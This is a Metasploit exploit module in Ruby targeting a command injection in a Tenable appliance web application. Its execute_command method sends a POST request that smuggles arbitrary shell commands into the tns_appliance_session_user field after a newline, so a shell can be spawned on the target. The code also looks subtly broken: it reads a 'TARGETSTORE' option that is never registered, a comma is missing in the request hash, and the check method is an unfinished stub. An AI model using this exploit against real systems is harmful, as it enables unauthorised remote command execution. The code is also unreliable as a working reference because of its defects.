##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote

  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Tenable Application < 4.5 Remote Code Execution',
      'Description'    => %q{
        This module exploits a command injection in Telnable <= 4.4.
        By injecting a command into the tns_appliance_session_user POST parameter,
        a shell can be spawned.
      },
      'Author'         => [
        'agix',       # Proof of concept
        'thecarterb'  # Metasploit module
      ],
      'References'     => [
        %w{EDB 39886}
      ],
      'DisclosureDate' => 'Apr 18 2017',
      'License'        => MSF_LICENSE,
      'Platform'       => 'linux',
      'Privileged'     => false,
      'Targets'        => [
        ['Telnable < 4.5', {}]
      ],
      'DefaultTarget'  => 0
    ))

    register_options([
      Opt::RPORT(8000),
      OptString.new('TARGETURI', [true, 'The URI of the vulnerable application', '/simpleupload.py'])
    ])
  end

  def check
    # TODO
  end

  def exploit
    print_status("Injecting payload...")
    execute_cmdstager(flavor: :bourne)
  end

  def execute_command(cmd, opts = {})
    uri = normalize_uri(datastore['TARGETSTORE'])
    send_request_cgi({
        'uri'       => uri,
        'method'    => 'POST'
        'vars_post' => {
          'returnpage'                  => '/',
          'action'                      => 'a',
          'tns_appliance_session_token' => '61:62',
          'tns_appliance_session_user'  => "a\"'%0a#{cmd}"
        }
    })
  end 
    
end
